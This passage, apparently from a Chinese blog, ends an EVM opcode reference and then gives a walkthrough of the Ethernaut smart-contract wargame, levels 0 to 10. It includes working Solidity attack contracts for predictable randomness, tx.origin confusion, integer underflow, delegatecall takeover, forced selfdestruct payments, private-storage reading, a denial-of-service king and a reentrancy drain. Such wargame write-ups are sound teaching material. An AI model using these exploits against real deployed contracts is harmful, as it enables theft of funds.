style="text-align:center">将当前合约的地址（<code>address(this)</code>）压入栈，当合约要知道自己地址时用</td></tr><tr><td style="text-align:center">ORIGIN</td><td style="text-align:center">0x32</td><td style="text-align:center">2</td><td style="text-align:center">将交易原始发送者的地址（<code>tx.origin</code>）压入栈，区分合约调用者和交易发起者</td></tr><tr><td style="text-align:center">CALLER</td><td style="text-align:center">0x33</td><td style="text-align:center">2</td><td style="text-align:center">将直接调用合约的地址（<code>msg.sender</code>）压入栈</td></tr><tr><td style="text-align:center">CALLVALUE</td><td style="text-align:center">0x34</td><td style="text-align:center">2</td><td style="text-align:center">将发送给合约的ETH数量（<code>msg.value</code>，单位 wei）压入栈</td></tr><tr><td style="text-align:center">CALLDATALOAD</td><td style="text-align:center">0x35</td><td style="text-align:center">3</td><td style="text-align:center">弹出栈顶元素 i 作为 calldata的偏移量 <br />从 calldata 的 i 位置开始读 32B 压入栈</td></tr><tr><td style="text-align:center">CALLDATASIZE</td><td style="text-align:center">0x36</td><td style="text-align:center">2</td><td style="text-align:center">将 calldata 的大小(B)压入栈</td></tr><tr><td style="text-align:center">CALLDATACOPY</td><td style="text-align:center">0x37</td><td style="text-align:center">3 * minimum_word_size <br />+扩展内存成本</td><td style="text-align:center">弹出栈顶3个元素 destOffset, offset, size，<br />从 calldata 的 offset 开始，拷贝 size(B) 的数据到内存 destOffset 位置</td></tr><tr><td style="text-align:center">CODESIZE</td><td style="text-align:center">0x38</td><td style="text-align:center">2</td><td style="text-align:center">将当前合约代码的大小(B)压入栈</td></tr><tr><td style="text-align:center">CODECOPY</td><td style="text-align:center">0x39</td><td style="text-align:center">同上上</td><td style="text-align:center">弹出栈顶3个元素 destOffset, offset, size，<br />同 CALLDATACOPY，将当前合约的代码拷贝到内存</td></tr><tr><td style="text-align:center">GASPRICE</td><td style="text-align:center">0x3A</td><td style="text-align:center">2</td><td style="text-align:center">将交易的gas价格压入栈</td></tr></tbody></table></div><h2 id="13-LOG-指令"><a href="#13-LOG-指令" class="headerlink" title="13. LOG 指令"></a>13. LOG 指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">LOGn<br />0 &lt;= n &lt;= 4</td><td style="text-align:center">0xA0~0xA4</td><td style="text-align:center">$375 \times  n + 8\times size + 内存扩展成本$</td><td style="text-align:center">弹出栈顶2 + n个元素 offset, size,  n 个主题(32B)，<br />从内存 offset 开始读取 size 数据，作为日志的 data，创建并输出日志</td></tr></tbody></table></div><h2 id="14-Return-指令"><a href="#14-Return-指令" class="headerlink" title="14. Return 指令"></a>14. Return 指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">RETURN</td><td style="text-align:center">0xF3</td><td style="text-align:center">扩展内存成本</td><td style="text-align:center">弹出栈顶2个元素 offset, size，<br />从内存 offset 开始读取 size 长度作为返回值，<br />存储到 <code>Return Data</code> 中，并终止当前操作</td></tr><tr><td style="text-align:center">RETURNDATASIZE</td><td style="text-align:center">0x3D</td><td style="text-align:center">2</td><td style="text-align:center">将 <code>Return Data</code> 的大小压入栈</td></tr><tr><td style="text-align:center">RETURNDATACOPY</td><td style="text-align:center">0x3E</td><td style="text-align:center">3 * minimum_word_size <br />+扩展内存成本</td><td style="text-align:center">弹出栈顶3个元素 destOffset, offset, size，<br />同 CALLDATACOPY，将部分 <code>Return Data</code>拷贝到内存</td></tr></tbody></table></div><h2 id="15-Revert-指令"><a href="#15-Revert-指令" class="headerlink" title="15. Revert 指令"></a>15. Revert 指令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">操作码</th><th style="text-align:center">gas</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">REVERT</td><td style="text-align:center">0xFD</td><td style="text-align:center">0</td><td style="text-align:center">终止交易执行，回滚所有状态更改<br />弹出栈顶2个元素 offset, offset，<br />作为内存中错误消息的起始和长度</td></tr><tr><td style="text-align:center">INVALID</td><td style="text-align:center">0xFE</td><td style="text-align:center">剩余所有</td><td style="text-align:center">指代无效操作，所有状态更改失效，并消耗所有 gas</td></tr></tbody></table></div><h2 id="16-Call-指令"><a href="#16-Call-指令" class="headerlink" title="16. Call 指令"></a>16. Call 指令</h2><h3 id="16-1-CALL"><a href="#16-1-CALL" class="headerlink" title="16.1 CALL"></a>16.1 CALL</h3><p><code>0xF1</code>，创造一个子环境去运行指定地址的代码，成功压入1，失败压入0（没有代码视为成功，发送余额不足视为失败，但不会回滚交易）。共弹出7个元素：</p><ol><li><code>gas</code>：给子环境的 gas，用剩的会返还。</li><li><code>address</code>：环境执行代码的账户地址</li><li><code>value</code>：发送的 ETH</li><li><code>argsOffset</code>：输入数据（calldata）在内存的起始位置</li><li><code>argsSize</code>：输入数据的大小（B）</li><li><code>retOffset</code>：返回数据在内存的存储的起始位置</li><li><code>retSize</code>：返回数据的长度</li></ol><h3 id="16-2-DELEGATCALL"><a href="#16-2-DELEGATCALL" class="headerlink" title="16.2 DELEGATCALL"></a>16.2 DELEGATCALL</h3><p><code>Solidity</code> 里 <code>delegatecall</code> 的底层。</p><p><code>0xF4</code>，创造一个和当前环境完全一样的子环境，但执行来自指定地址的代码（就像创建了一个引用）。共弹出6个元素，除没有 <code>value</code> 外，同上。</p><h3 id="16-3-STATICCALL"><a href="#16-3-STATICCALL" class="headerlink" title="16.3 STATICCALL"></a>16.3 STATICCALL</h3><p><code>0xFA</code>，创建一个子环境去运行指定地址的代码，但代码中不允许包含以下更改状态和发送 ETH 的指令：</p><ul><li><code>CREATE</code> 系</li><li><code>LOG</code> 系</li><li><code>SSTORE</code></li><li><code>SELFDESTRUCT</code></li><li><code>value</code> 不为 0 的 <code>CALL</code></li></ul><p>共弹出6个元素，同上。</p><h2 id="17-CREATE-指令"><a href="#17-CREATE-指令" class="headerlink" title="17. CREATE 指令"></a>17. CREATE 指令</h2><h3 id="17-1-CREATE"><a href="#17-1-CREATE" class="headerlink" title="17.1 CREATE"></a>17.1 CREATE</h3><p><code>0xF0</code>，创建一个新的合约。共弹出3个元素，分别是：</p><ol><li><code>value</code>：发送给新合约的 ETH</li><li><code>offset</code>：新合约执行的 <code>initcode</code> 的起始地址</li><li><code>size</code>：<code>inicode</code> 的长度</li></ol><p>创建合约的简化流程：</p><ol><li>弹出3个元素</li><li>计算合约地址</li><li>更新 ETH 余额</li><li>初始化执行 <code>initcode</code> 的新的上下文 <code>evm_create</code></li><li>执行 <code>initcode</code> </li><li>若执行成功，更新账户状态：<ul><li>更新 <code>balance</code>，<code>nounce = 0</code>，将 <code>code</code> ，<code>storage</code>设为 <code>evm_create</code> 的返回值和 <code>storage</code></li></ul></li><li>成功，将新地址压入栈；否则压入0</li></ol><h3 id="17-2-CREATE2"><a href="#17-2-CREATE2" class="headerlink" title="17.2 CREATE2"></a>17.2 CREATE2</h3><p><code>0xF5</code>，大致同上，但弹出4个元素（追加一个 <code>salt</code>）。</p><p>地址计算变更为如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">address</span> = <span class="hljs-built_in">keccak256</span>( <span class="hljs-number">0</span>xff + sender_address + salt + <span class="hljs-built_in">keccak256</span>(initialisation_code) ) 的后<span class="hljs-number">20</span>字节<br></code></pre></td></tr></table></figure></p>]]></content>
    
    
    
    <tags>
      
      <tag>EVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The Ethernaut</title>
    <link href="/2025/03/22/The%20Ethernaut/"/>
    <url>/2025/03/22/The%20Ethernaut/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Ethernaut"><a href="#The-Ethernaut" class="headerlink" title="The Ethernaut"></a>The Ethernaut</h1><h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00. Hello Ethernaut"></a>00. Hello Ethernaut</h2><ol><li><p>在控制台输入 <code>await contract.info()</code>，获得提示：==You will find what you need in info1().==</p></li><li><p>输入 <code>await contract.info1()</code>，得到==Try info2(), but with “hello” as a parameter.==，即以 “hello” 作为<code>info2()</code>函数的参数</p></li><li><p>输入 <code>await contract.info2(&quot;hello&quot;)</code>，得到==The property infoNum holds the number of the next info method to call ”==</p></li><li><p>输入 <code>await contract.infoNum()</code>，查看详细数据，结果如下，说明下一个查看的是 <code>info42()</code>(宇宙的终极答案)<img src=".\pics\00\00.01.png" alt=""></p></li><li><p>输入 <code>await contract.info42()</code>，得到==theMethodName is the name of the next method.==，即下一个函数的名字为 <code>theMethodName（）</code></p></li><li><p>输入 <code>await contract.theMethodName()</code>，得到==The method name is method7123949.==</p></li><li><p>输入 <code>await contract.method7123949()</code>，得到==If you know the password, submit it to authenticate().==，显然我们不知道密码</p></li><li><p>输入 <code>await contract.password()</code>，得到密码==ethernaut0==，把它作为 <code>authenticate()</code> 函数的参数</p></li><li><p>输入 <code>await contract.authenticate(&quot;ethernaut0&quot;)</code>，提交实例，过关</p></li><li><p>✌(◕‿-)✌ 牛逼！, 你通过了这关!!!</p></li></ol><ul><li>摊牌了，在最开始输入 <code>await contract</code> 时就获得了该关的所有函数，实际可以跳着走</li></ul><p><img src=".\pics\00\00.02.png" alt=""></p><h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01. Fallback"></a>01. Fallback</h2><p>过关条件：</p><ol><li>获得这个合约的所有权</li><li>把他的余额减到0</li></ol><h3 id="条件1：获得这个合约的所有权"><a href="#条件1：获得这个合约的所有权" class="headerlink" title="条件1：获得这个合约的所有权"></a>条件1：获得这个合约的所有权</h3><p>很明显，<code>owner</code> 的改变仅在 <code>contribute()</code> 和 <code>receive()</code> 中出现。</p><p>由于 <code>constructor</code> 中将 <code>contributions[owner]</code> 设为 1000 ether，我们无法支付，排除。</p><p>看向 <code>receive()</code>，条件为 <code>mas.value &gt; 0</code>（简单），<code>contributions[msg.sender] &gt; 0</code></p><ul><li>结论： <code>contribute()</code> 支付 1wei，使 <code>contributions[msg.sender] &gt; 0</code> —-&gt; <code>receive()</code> 改变 owner</li></ul><h3 id="条件2：把他的余额减到0"><a href="#条件2：把他的余额减到0" class="headerlink" title="条件2：把他的余额减到0"></a>条件2：把他的余额减到0</h3><p>直接用 <code>withdraw()</code> 函数就行了。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><ul><li><p><code>receive()</code> 的调用方法：确认发送的以太币数量（比如1wei），使用低级交互，不输入地址，直接 Transact</p></li><li><p>小狐狸交互好慢啊 &gt;_&lt;</p></li></ul><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02. Fallout"></a>02. Fallout</h2><h3 id="条件：获得这个合约的所有权"><a href="#条件：获得这个合约的所有权" class="headerlink" title="条件：获得这个合约的所有权"></a>条件：获得这个合约的所有权</h3><p>观察发现，该合约仅在构造函数中可以更改 owner。</p><p>再观察发现，如头图所示，该构造函数并非构造函数，而是一个名为 <code>Fal1out()</code> 的普通函数。</p><ul><li>结论：使用钱包的地址调用该合约即可</li></ul><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><ul><li><p>由于源代码无法完成编译，使用如下接口变相调用该合约</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Fallout &#123;<br>    function Fal1out() external payable;<br>    function owner() external view returns(address owner);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03. Coin Flip"></a>03. Coin Flip</h2><h3 id="条件：连续猜对十次结果"><a href="#条件：连续猜对十次结果" class="headerlink" title="条件：连续猜对十次结果"></a>条件：连续猜对十次结果</h3><p>要求我们输入的 <code>_guess</code> 与 <code>side</code> 相等。</p><p>观察 <code>side = coinFlip == 1 ? true : false</code>，说明要判断 <code>CoinfFlip</code> 是否为 1</p><p>而 <code>coinFlip = blockValue / FACTOR</code> —-&gt; <code>blockValue</code> 是否等于 <code>FACTOR</code></p><p><code>blockValue = uint256( blockhash(block.number - 1) )</code>，<code>blockValue</code> 为上一个区块的哈希转为整型后的结果</p><ul><li>结论：计算出这个结果（当然是让电脑来）—-&gt; 以结果为参数，调用 <code>flip</code> 函数</li></ul><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>通过如下代码，一键计算并调用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface CoinFlip &#123;<br>    function flip(bool _guess) external returns (bool);<br>&#125;<br><br>contract Coin &#123;<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>    address addr;<br>    constructor (address _addr) &#123;<br>        addr = _addr;<br>    &#125;<br>    function getNum() public &#123;<br>        uint256 blockValue = uint256(blockhash(block.number - 1));<br>        uint256 coinFlip = blockValue / FACTOR;<br>        bool side = coinFlip == 1 ? true : false;<br>        CoinFlip(addr).flip(side);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>调用两次后，调用 <code>getter</code> 函数 <code>await contract.consecutiveWins()</code>，结果如下：</p><p><img src=".\pics\03\03.01.png" alt=""></p><p>正确，慢慢执行十次就行了。</p><ul><li>注：两次执行间要有一定间隔，否则会报错 <code>Gas estimation failed</code>。</li></ul><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04. Telephone"></a>04. Telephone</h2><h3 id="条件：获得下面合约的所有权"><a href="#条件：获得下面合约的所有权" class="headerlink" title="条件：获得下面合约的所有权"></a>条件：获得下面合约的所有权</h3><p>显然，想改变 owner 只能通过 <code>changeOwner</code> 函数，且满足 <code>tx.origin != msg.sender</code>，msg.sender 就是我们的钱包地址。</p><p>查阅<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">官网</a>，<code>tx.origin</code> (<code>address</code>)：交易的发送者（完整调用链）。</p><ul><li>结论：直接用我们的钱包地址调用 <code>changeOwner</code> 函数即可。</li></ul><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><p>部署并调用 <code>change</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Tele &#123;<br>    function changeOwner(address _owner) external;<br>&#125;<br><br>contract get &#123;<br>    address addr = 0x1E5592cc2baFC29eef55feaeFE4f0e7302bd0a24;// 根据生成的合约地址更改<br>    function change() public &#123;<br>        Tele(addr).changeOwner(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05. Token"></a>05. Token</h2><h3 id="前置知识：数据的溢出（overflow）"><a href="#前置知识：数据的溢出（overflow）" class="headerlink" title="前置知识：数据的溢出（overflow）"></a>前置知识：数据的溢出（overflow）</h3><blockquote><p>Solidity 中的整数限制在某个范围内。例如，对于 <code>uint32</code>，范围是 <code>0</code> 到 <code>2**32 - 1</code>。</p></blockquote><ul><li>上溢：对于 <code>uint32</code> 类型的变量，达到最大值之后再 +1，变量会变为最小值 0</li><li>下溢：对于 <code>uint32</code> 类型的变量，达到最小值之后再 -1，变量会变为最大值 2**32 - 1</li></ul><blockquote><p> Solidity v0.8.0 重大变更…    语义的静默变化…    -&gt;算术运算在下溢和上溢时会回退。你可以使用 <code>unchecked &#123; ... &#125;</code> 来使用之前的环绕行为。</p></blockquote><p>由于 <code>Solidity</code> 在 v0.8.0增加了自动回退，可以用以下代码测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract test &#123;<br>    function overflow() public pure returns(uint32)&#123;<br>        uint32 x = 2**32 - 1; <br>        unchecked &#123;return (x + 1);&#125;<br>    &#125;<br>    function underflow() public pure returns(bool)&#123;<br>        uint32 x = 0; <br>        unchecked &#123;return (x - 1 == 2**32 - 1);&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果分别为 0 和 true</p><h3 id="条件：增加你手中的-token-数量"><a href="#条件：增加你手中的-token-数量" class="headerlink" title="条件：增加你手中的 token 数量"></a>条件：增加你手中的 token 数量</h3><p>显然要通过 <code>transfer</code> 函数。</p><p>由于 v0.6.0 没有自动回退，我们可以通过让 <code>balances[msg.sender] - _value</code> 发生下溢来绕开 require。</p><ul><li>结论：通过 <code>contract</code> 调用 <code>transfer(wallet, 任意正数)</code>（由于 msg.sender 为合约地址，减去任意数后下溢，变为很大的数）</li></ul><h3 id="实操-4"><a href="#实操-4" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Token &#123;<br>     function transfer(address _to, uint256 _value) external returns (bool);<br>     function balanceOf(address _owner) external view returns (uint256 balance);<br>&#125;<br><br>contract moreTokens &#123;<br>    address addr;<br>    address wallet;<br>    constructor(address _contract) &#123;<br>        addr = _contract;<br>    &#125;<br>    function addToken() public &#123;<br>        Token(addr).transfer(msg.sender, 1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>实际操作后，<code>balances[合约地址] = 115792089237316195423570985008687907853269984665640564039457584007913129639935</code>，</p><p><code>balances[钱包地址] = 21</code>。你过关！</p></li></ul><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06. Delegation"></a>06. Delegation</h2><h3 id="条件：获得这个合约的所有权-1"><a href="#条件：获得这个合约的所有权-1" class="headerlink" title="条件：获得这个合约的所有权"></a>条件：获得这个合约的所有权</h3><p>显然，要通过 <code>fallback()</code> 函数来 <code>delegatecall</code> <code>Delegate</code> 合约中的 <code>pwn()</code> 函数。</p><p>这时，<code>msg.sender</code> 仍是我们，<code>msg.data</code> 是 <code>pwn()</code> 的，而上下文是 <code>Delegation</code> 合约的，从而通过 <code>Delegate</code> 的 <code>pwn()</code> 修改 <code>Delegation</code> 中的 <code>owner</code>。</p><h3 id="实操-5"><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3><ol><li>以 <code>Delegation</code> 的地址部署 <code>Delegate</code> 合约</li><li>调用 <code>pwn()</code>，向该地址传入 <code>pwn()</code> 的 <code>abi</code>，由于 <code>Delegation</code> 不存在该函数，转入 <code>fallback</code>，将其作为 <code>msg.data</code> 来 <code>delegatecall</code> <code>Delegate</code> 合约。</li></ol><h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07. Force"></a>07. Force</h2><h3 id="条件：是使合约的余额大于0"><a href="#条件：是使合约的余额大于0" class="headerlink" title="条件：是使合约的余额大于0"></a>条件：是使合约的余额大于0</h3><p>嗯，自毁</p><ul><li>结论： 给自己的合约1wei -&gt; <code>selfdestruct(to)</code></li></ul><h3 id="实操-6"><a href="#实操-6" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract force &#123;<br>    address to;<br>    constructor (address _to)payable &#123;<br>        to = _to;<br>    &#125;<br>    function send() public &#123;<br>        selfdestruct(payable(to));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="08-Vault"><a href="#08-Vault" class="headerlink" title="08. Vault"></a>08. Vault</h2><h3 id="前置知识：插槽-slot"><a href="#前置知识：插槽-slot" class="headerlink" title="前置知识：插槽 slot"></a>前置知识：插槽 slot</h3><blockquote><p>合约的状态变量以紧凑的方式存储在存储中，以至于多个值有时使用相同的存储槽。 除了动态大小的数组和 映射mapping 外，<strong>数据是连续存储的，逐项存储，从第一个状态变量开始，该变量存储在槽 <code>0</code> 中</strong>。 对于每个变量，根据其类型确定以字节为单位的大小。 多个连续的项如果少于 32 字节，则尽可能打包到一个存储槽中，遵循以下规则：</p><ul><li>存储槽中的第一项是低位对齐存储的。</li><li>值类型仅使用存储它们所需的字节数。</li><li>如果存储槽中的剩余空间不足以储存一个值类型，那么它会存储在下一个存储槽中。</li><li>结构体和数组数据总是会开启一个新槽，并且它们的数据根据这些规则紧密打包。</li><li>紧随结构体或数组数据的数据总是开始一个新的存储槽。</li></ul><p>对于使用继承的合约，状态变量的顺序由从最基础合约开始的 C3 线性化顺序决定。 如果上述规则允许，来自不同合约的状态变量可以共享同一个存储槽。</p><p>结构体和数组的元素是依次存储的，就像它们单独声明时一样。</p></blockquote><p>简单来说，状态变量为 storage 类型，storage 共有 2^256^ 个插槽，一个插槽存 32 字节。</p><p>第一个状态变量从槽 0 的右端开始存，依次往后。</p><p>如果上一个变量没把槽占满，下一个变量又刚好塞得进去，那两个变量就塞一个槽里，直到剩余空间塞不下下一个变量。</p><p>若变量 a 在槽1，变量 b 塞不进槽1，那么变量 b 就存在槽2（槽1的顺位）；此时变量 c 能塞进槽1，就和变量 a 一起存在槽1中，尽管变量的声明顺序为a, b, c。</p><p>可以借助以下图示理解（<a href="https://s.foresightnews.pro/article/detail/1511">来自这里</a>）</p><p><img src="./pics/09/09.01.png" alt=""></p><ul><li>详见<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html">官方文档</a>，或<a href="https://s.foresightnews.pro/article/detail/1511">智能合约安全审计入门篇 —— 访问私有数据</a></li></ul><h3 id="条件：打开金库"><a href="#条件：打开金库" class="headerlink" title="条件：打开金库"></a>条件：打开金库</h3><blockquote><p>来自官方的警告：</p><p>将某些内容设置为 <code>private</code> 或 <code>internal</code> 仅仅是防止其他合约读取或修改这些信息，但它仍然对区块链外的整个世界可见。</p><p>以及：</p><p>私有信息和随机性</p><p>你在智能合约中使用的所有内容都是公开可见的，即使是标记为 <code>private</code> 的局部变量和状态变量。</p><p>在智能合约中使用随机数是相当棘手的，如果你不希望区块构建者能够作弊。</p></blockquote><p>因此，我们可以通过访问插槽直接获得 password。</p><p>方法为：<code>web3.eth.getStorageAt(合约地址,插槽索引)</code>。</p><ul><li>结论：获得 password -&gt; 调用 unlock 函数</li></ul><h3 id="实操-7"><a href="#实操-7" class="headerlink" title="实操"></a>实操</h3><ol><li>显然 password 的索引为1，输入 <code>await web3.eth.getStorageAt(&quot;0x53b47D4494909d6E6773875FD195938C6826A34A&quot;,1)</code><ul><li>记得地址要加引号</li></ul></li><li>调用函数：<code>await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)</code></li><li>你过关</li></ol><h2 id="09-King"><a href="#09-King" class="headerlink" title="09. King"></a>09. King</h2><h3 id="条件：提交实例时，阻止关卡获得王位"><a href="#条件：提交实例时，阻止关卡获得王位" class="headerlink" title="条件：提交实例时，阻止关卡获得王位"></a>条件：提交实例时，阻止关卡获得王位</h3><p>即：我们要阻止 <code>king = msg.sender</code>的执行，有两个方法：</p><ul><li><p>其一，通过 require 的 <code>msg.value &gt;= prize</code>，显然不可能，它肯定会直接使用一个超大的值。</p></li><li><p>其二，让 transfer 失败，自动回滚。显然，只能通过这个方法。</p></li></ul><p>而让 tranfer 失败也有两个方法：</p><ul><li>其一，gas 超过 2300</li><li>其二，transfer to 的对象没有 fallback 或 receive，无法接受 ETH</li></ul><p>显然选择法二</p><ul><li>结论：先让我们的 contract 成为 King -&gt; 由于 contract 无法接受 ETH，transfer 失败，变量 king 无法被改变</li></ul><h3 id="实操-8"><a href="#实操-8" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract win &#123;<br>    address addr;<br>    constructor(address _addr) payable &#123;<br>        addr = _addr;<br>    &#125;<br>    <br>    function beKing(uint256 _prize) public payable&#123;<br>        (bool success,) = addr.call&#123;value: _prize&#125;(&quot;&quot;);<br>        if (!success) &#123;<br>            revert(&quot;It failed&quot;);<br>        &#125;<br>    &#125;<br><br>    function getBack(address payable me, uint256 left) public &#123;<br>        me.transfer(left);<br>    &#125;<br><br>    function getBalance() public view returns(uint256)&#123;<br>        return (address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署时传入与 prize 相等的 ETH</p><h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><h3 id="条件：盗取所有的-ETH"><a href="#条件：盗取所有的-ETH" class="headerlink" title="条件：盗取所有的 ETH"></a>条件：盗取所有的 ETH</h3><p>字如其名，重入攻击，具体可参考：<a href="https://learnblockchain.cn/docs/solidity/security-considerations.html">安全考量</a>中的重入板块。</p><p>其特点是：先提取资金，在更新数据。</p><p>由于提取资金时，对象可能是合约而非普通的钱包地址，可以利用 receive 在接收 ETH 的同时，赶在更新数据前再次提取资金。</p><ul><li>结论：在 receive 函数中，再次调用 withdraw 函数</li></ul><h3 id="实操-9"><a href="#实操-9" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IRe &#123;<br>    function donate(address _to) external payable;<br>    function balanceOf(address _who) external view returns (uint256 balance);<br>    function withdraw(uint256 _amount) external;<br>&#125;<br><br>contract a &#123;<br>    IRe ire;<br>    constructor(address _addr) payable &#123;<br>        ire = IRe(_addr);<br>    &#125;<br>    <br>    function main() public payable &#123;<br>        ire.donate&#123;value: 1e15&#125;(address(this));<br>        ire.withdraw(1e15);<br>    &#125;<br>    <br>    function getBack(address payable me, uint256 left) public &#123;<br>        me.transfer(left);<br>    &#125;<br>    <br>    receive() external payable &#123; <br>        if (address(ire).balance &gt; 0) &#123;<br>            ire.withdraw(1e15);// 选择1e15是因为观察到该合约仅有0.001 ether<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>与二面中压轴题类似，可做参考</p><h4 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h4><p>带 1 ether 部署金库，尝试取出它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br>contract AdvancedVault &#123; <br>    event Deposit(address indexed depositor, uint256 amount);<br>    event Withdrawal(address indexed withdrawer, uint256 amount);<br>    event BalanceChange(address indexed account, 